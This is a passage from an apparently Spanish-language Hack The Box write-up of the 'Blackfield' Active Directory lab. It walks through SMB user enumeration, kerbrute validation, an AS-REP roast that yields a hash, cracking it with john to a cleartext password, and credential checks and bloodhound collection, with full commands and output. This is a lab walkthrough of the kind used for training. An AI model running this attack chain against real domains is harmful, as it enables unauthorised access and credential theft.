-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JDjouka
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JKondziola
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JLeytushsenior
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JLuthner
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JMoorehendrickson
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JPistachio
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JScima
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JSebaali
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JShoenherr
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JShuselvt
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KAmavisca
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KAtolikian
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KBrokinn
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KCockeril
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KColtart
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KCyster
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KDorney
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KKoesno
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KLangfur
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KMahalik
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KMasloch
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KMibach
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KParvankova
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KPregnolato
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KRasmor
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KShievitz
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KSojdelius
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KTambourgi
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KVlahopoulos
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KZyballa
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LBajewsky
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LBaligand
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LBarhamand
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LBirer
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LBobelis
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LChippel
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LChoffin
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LCominelli
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LDruge
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LEzepek
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LHyungkim
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LKarabag
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LKirousis
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LKnade
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LKrioua
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LLefebvre
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LLoeradeavilez
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LMichoud
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LTindall
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LYturbe
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MArcynski
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MAthilakshmi
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MAttravanam
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MBrambini
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MHatziantoniou
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MHoerauf
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MKermarrec
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MKillberg
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MLapesh
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MMakhsous
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MMerezio
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MNaciri
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MShanmugarajah
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MSichkar
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MTemko
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MTipirneni
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MTonuri
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MVanarsdel
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NBellibas
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NDikoka
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NGenevro
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NGoddanti
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NMrdirk
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NPulido
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NRonges
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NSchepkie
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NVanpraet
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	OBelghazi
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	OBushey
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	OHardybala
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	OLunas
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ORbabka
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PBourrat
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PBozzelle
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PBranti
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PCapperella
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PCurtz
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PDoreste
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PGegnas
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PMasulla
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PMendlinger
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PParakat
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PProvencer
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PTesik
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PVinkovich
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PVirding
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PWeinkaus
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RBaliukonis
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RBochare
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RKrnjaic
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RNemnich
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RPoretsky
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RStuehringer
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RSzewczuga
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RVallandas
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RWeatherl
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RWissor
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SAbdulagatov
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SAjowi
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SAlguwaihes
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SBonaparte
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SBouzane
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SChatin
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SDellabitta
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SDhodapkar
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SEulert
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SFadrigalan
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SGolds
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SGrifasi
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SGtlinas
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SHauht
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SHederian
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SHelregel
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SKrulig
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SLewrie
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SMaskil
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	Smocker
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SMoyta
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SRaustiala
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SReppond
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SSicliano
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SSilex
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SSolsbak
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	STousignaut
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	support
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	svc_backup
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SWhyte
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SWynigear
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TAwaysheh
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TBadenbach
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TCaffo
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TCassalom
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TEiselt
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TFerencdo
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TGaleazza
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TKauten
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TKnupke
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TLintlop
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TMusselli
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TOust
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TSlupka
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TStausland
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TZumpella
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	UCrofskey
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	UMarylebone
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	UPyrke
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VBublavy
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VButziger
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VFuscca
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VLitschauer
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VMamchuk
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VMarija
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VOlaosun
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VPapalouca
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	WSaldat
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	WVerzhbytska
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	WZelazny
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	XBemelen
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	XDadant
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	XDebes
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	XKonegni
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	XRykiel
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YBleasdale
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YHuftalin
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YKivlen
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YKozlicki
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YNyirenda
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YPredestin
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YSeturino
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YSkoropada
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YVonebers
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YZarpentine
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZAlatti
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZKrenselewski
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZMalaab
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZMiick
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZScozzari
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZTimofeeff
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZWausik
-	SYSVOL                                            	NO ACCESS	Logon server share
-</code></pre></div></div>
-
-<ul>
-  <li>Al parecer son nombres de usuarios de todos estos usuarios debemos ver cuantos de esos son verdaderos.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbmap <span class="nt">-H</span> 10.129.126.69 <span class="nt">-u</span> <span class="s1">'miguelito'</span> <span class="nt">-r</span> <span class="s1">'profiles$'</span> <span class="nt">--no-banner</span> | <span class="nb">awk</span> <span class="s1">'NF{print $NF}'</span> <span class="o">&gt;</span> ../content/users.txt
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Vamos a usar <a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a> para validar los usuarios.</p>
-  </li>
-  <li>
-    <p>Vamos agregar el nombre del dominio al <strong>/etc/hosts</strong>.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">echo</span> <span class="s2">"10.129.126.69 BLACKFIELD.local blackfield.local"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
-10.129.126.69 BLACKFIELD.local blackfield.local
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora validamos los usuarios.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content /opt/kerbrute_linux_amd64 userenum <span class="nt">--dc</span> 10.129.126.69 <span class="nt">-d</span> blackfield.local users.txt
-
-    __             __               __
-   / /_____  _____/ /_  _______  __/ /____
-  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
- / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
-/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/
-
-Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 04/19/24 - Ronnie Flathers @ropnop
-
-2024/04/19 19:20:59 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
-2024/04/19 19:20:59 <span class="o">&gt;</span>  	10.129.126.69:88
-
-2024/04/19 19:21:19 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 audit2020@blackfield.local
-2024/04/19 19:23:14 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 support@blackfield.local
-2024/04/19 19:23:19 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 svc_backup@blackfield.local
-2024/04/19 19:23:45 <span class="o">&gt;</span>  Done! Tested 315 usernames <span class="o">(</span>3 valid<span class="o">)</span> <span class="k">in </span>166.123 seconds
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Ahora vamos hacer un <code class="language-plaintext highlighter-rouge">ASREPRoast Attack</code> con los usuarios validos que tenemos <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#asreproast">https://zer1t0.gitlab.io/posts/attacking_ad/#asreproast</a>.</p>
-  </li>
-  <li>
-    <p>Tenemos el hash del usuario <code class="language-plaintext highlighter-rouge">support</code> ya que no tiene activado el <code class="language-plaintext highlighter-rouge">UF_DONT_REQUIRE_PREAUTH</code>.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers blackfield.local/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> valid_users.txt
-Impacket v0.11.0 - Copyright 2023 Fortra
-
-<span class="o">[</span>-] User audit2020 doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
-$krb5asrep$23$support@BLACKFIELD.LOCAL:0eabfacfb6de7f81120e4c162e0e1df9$2035e324a36e8b827defd1956fca64c98a164419f038369d586c107605a9aca2cf7ae0690a7e573446eb7d609ee6b584986de2d19383bc16f45a4872baa6239ab9e9d36e9704533f714a89ef6f6f3d9c956c6474ffcc127e0979e7cb60d9b55a2e031cc45370a9e9bf16f3dffccab5d7e838a39dd7be656a598d9f153cf0d7bc5a979cdf621b5d6e02bd483edb4284ad986bd55a0295f22a6dcc199135aa5886c782f448b78a711dcb32899edf17dccaa02b5d289564c88b022d4a25ac779d44b1c3ce5e96cdc41c417955a757506294434272fb38e386f507e062a3bb49b288ed2167d970cc81969e31fc1d307cebcf659123e0
-[-] User svc_backup doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a crackear el hash.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
-</span>Using default input encoding: UTF-8
-Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x]<span class="o">)</span>
-Will run 2 OpenMP threads
-Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
-<span class="c">#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)</span>
-1g 0:00:01:05 DONE <span class="o">(</span>2024-04-19 19:29<span class="o">)</span> 0.01524g/s 218487p/s 218487c/s 218487C/s <span class="c">#1WIF3Y..#*burberry#*1990</span>
-Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
-Session completed.
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a validar que la contraseña sea correcta.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.126.69 <span class="nt">-u</span> <span class="s1">'support'</span> <span class="nt">-p</span> <span class="s1">'#00^BlackKnight'</span>
-SMB         10.129.126.69   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-SMB         10.129.126.69   445    DC01             <span class="o">[</span>+] BLACKFIELD.local<span class="se">\s</span>upport:#00^BlackKnight
-</code></pre></div></div>
-
-<ul>
-  <li>El usuario no forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.129.126.69 <span class="nt">-u</span> <span class="s1">'support'</span> <span class="nt">-p</span> <span class="s1">'#00^BlackKnight'</span>
-SMB         10.129.126.69   5985   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span>
-HTTP        10.129.126.69   5985   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.126.69:5985/wsman
-WINRM       10.129.126.69   5985   DC01             <span class="o">[</span>-] BLACKFIELD.local<span class="se">\s</span>upport:#00^BlackKnight
-</code></pre></div></div>
-
-<h2 id="support-enumeration">Support Enumeration</h2>
-
-<ul>
-  <li>Vamos a listar los recursos compartidos nivel de red para ese usuario ya que tenemos credenciales validas.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.126.69 <span class="nt">-u</span> <span class="s1">'support'</span> <span class="nt">-p</span> <span class="s1">'#00^BlackKnight'</span> <span class="nt">--no-banner</span>
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
-
-<span class="o">[</span>+] IP: 10.129.126.69:445	Name: BLACKFIELD.local    	Status: Authenticated
-	Disk                                                  	Permissions	Comment
-	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
-	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
-	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
-	forensic                                          	NO ACCESS	Forensic / Audit share.
-	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
-	NETLOGON                                          	READ ONLY	Logon server share
-	profiles<span class="nv">$ </span>                                        	READ ONLY	
-	SYSVOL                                            	READ ONLY	Logon server share
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Vamos a ver si en <code class="language-plaintext highlighter-rouge">profiles$</code> hay algo interesante.</p>
-  </li>
-  <li>
-    <p>Pero nada solo había carpetas para cada usuario y dentro no había nada.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.126.69 <span class="nt">-u</span> <span class="s1">'support'</span> <span class="nt">-p</span> <span class="s1">'#00^BlackKnight'</span> <span class="nt">-r</span> <span class="s1">'profiles$/support/'</span> <span class="nt">--no-banner</span>
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
-
-<span class="o">[</span>+] IP: 10.129.126.69:445	Name: BLACKFIELD.local    	Status: Authenticated
-	Disk                                                  	Permissions	Comment
-	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
-	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
-	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
-	forensic                                          	NO ACCESS	Forensic / Audit share.
-	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
-	NETLOGON                                          	READ ONLY	Logon server share
-	profiles<span class="nv">$ </span>                                        	READ ONLY	
-	./profiles<span class="nv">$support</span>/
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	<span class="nb">.</span>
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	..
-	SYSVOL                                            	READ ONLY	Logon server share
-➜  content
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">ldapdomaindump</code> para enumerar por ese protocolo.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  html ldapdomaindump <span class="nt">-u</span> <span class="s1">'blackfield.local\support'</span> <span class="nt">-p</span> <span class="s1">'#00^BlackKnight'</span> 10.129.126.69
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting to host...
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Binding to host
-<span class="o">[</span>+] Bind OK
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting domain dump
-<span class="o">[</span>+] Domain dump finished
-</code></pre></div></div>
-
-<ul>
-  <li>Aquí tenemos los archivos que nos genera.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  html ll
-total 1.4M
-<span class="nt">-rw-r--r--</span> 1 root root 2.7K Apr 19 19:41 domain_computers.grep
-<span class="nt">-rw-r--r--</span> 1 root root 6.1K Apr 19 19:41 domain_computers.html
-<span class="nt">-rw-r--r--</span> 1 root root  39K Apr 19 19:41 domain_computers.json
-<span class="nt">-rw-r--r--</span> 1 root root 6.4K Apr 19 19:41 domain_computers_by_os.html
-<span class="nt">-rw-r--r--</span> 1 root root  10K Apr 19 19:41 domain_groups.grep
-<span class="nt">-rw-r--r--</span> 1 root root  17K Apr 19 19:41 domain_groups.html
-<span class="nt">-rw-r--r--</span> 1 root root  78K Apr 19 19:41 domain_groups.json
-<span class="nt">-rw-r--r--</span> 1 root root  262 Apr 19 19:41 domain_policy.grep
-<span class="nt">-rw-r--r--</span> 1 root root 1.2K Apr 19 19:41 domain_policy.html
-<span class="nt">-rw-r--r--</span> 1 root root 6.0K Apr 19 19:41 domain_policy.json
-<span class="nt">-rw-r--r--</span> 1 root root   71 Apr 19 19:41 domain_trusts.grep
-<span class="nt">-rw-r--r--</span> 1 root root  828 Apr 19 19:41 domain_trusts.html
-<span class="nt">-rw-r--r--</span> 1 root root    2 Apr 19 19:41 domain_trusts.json
-<span class="nt">-rw-r--r--</span> 1 root root  62K Apr 19 19:41 domain_users.grep
-<span class="nt">-rw-r--r--</span> 1 root root 143K Apr 19 19:41 domain_users.html
-<span class="nt">-rw-r--r--</span> 1 root root 890K Apr 19 19:41 domain_users.json
-<span class="nt">-rw-r--r--</span> 1 root root 106K Apr 19 19:41 domain_users_by_group.html
-<span class="nt">-rw-r--r--</span> 1 root root  11K Feb  5 19:54 index.html
-<span class="nt">-rw-r--r--</span> 1 root root  615 Feb  5 19:57 index.nginx-debian.html
-</code></pre></div></div>
-
-<ul>
-  <li>Para poder verlos vamos habilitar el servidor de Apache2.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  html service apache2 start
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora podemos ver cualquier archivo que queramos.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/hard/blackfield/1.png" />
-</p>
-
-<ul>
-  <li>El usuario <code class="language-plaintext highlighter-rouge">svc_backup</code> pertenece al grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/hard/blackfield/2.png" />
-</p>
-
-<h2 id="audit2020">audit2020</h2>
-
-<ul>
-  <li>Bueno necesitamos su contraseña pero por el momento no conocemos vías para convertirnos en ese usuario así que vamos a usar <code class="language-plaintext highlighter-rouge">bloodhound</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  bloodhound bloodhound-python <span class="nt">-c</span> all <span class="nt">-u</span> <span class="s1">'support'</span> <span class="nt">-p</span> <span class="s1">'#00^BlackKnight'</span> <span class="nt">-ns</span> 10.129.23.192 <span class="nt">-d</span> blackfield.local
-INFO: Found AD domain: blackfield.local
-INFO: Getting TGT <span class="k">for </span>user
-WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: <span class="o">[</span>Errno Connection error <span class="o">(</span>dc01.blackfield.local:88<span class="o">)]</span> <span class="o">[</span>Errno <span class="nt">-2</span><span class="o">]</span> Name or service not known
-INFO: Connecting to LDAP server: dc01.blackfield.local
-INFO: Found 1 domains
-INFO: Found 1 domains <span class="k">in </span>the forest
-INFO: Found 18 computers
-INFO: Connecting to LDAP server: dc01.blackfield.local
-INFO: Found 316 <span class="nb">users
-</span>INFO: Found 52 <span class="nb">groups
-</span>INFO: Found 2 gpos
-INFO: Found 1 ous
-INFO: Found 19 containers
-INFO: Found 0 trusts
-INFO: Starting computer enumeration with 10 workers
-INFO: Querying computer:
-INFO: Querying computer:
-INFO: Querying computer:
-INFO: Querying computer:
-INFO: Querying computer:
-INFO: Querying computer:
-INFO: Querying computer:
-INFO: Querying computer:
-INFO: Querying computer:
-INFO: Querying computer:
-INFO: Querying computer:
-INFO: Querying computer:
-INFO: Querying computer:
-INFO: Querying computer:
-INFO: Querying computer:
-INFO: Querying computer:
-INFO: Querying computer:
-INFO: Querying computer: DC01.BLACKFIELD.local
-INFO: Done <span class="k">in </span>00M 24S
-</code></pre></div></div>
-
-<ul>
-  <li>Podemos forzar a cambiarle la contraseña al usuario <code class="language-plaintext highlighter-rouge">AUDIT2020</code>.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/hard/blackfield/3.png" />
-</p>
-
-<ul>
-  <li>Podemos usar <code class="language-plaintext highlighter-rouge">net</code>.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/hard/blackfield/4.png" />
-</p>
-
-<ul>
-  <li>Y con esto ya se supone que le cambiamos la contraseña.</li>
-</ul>
-
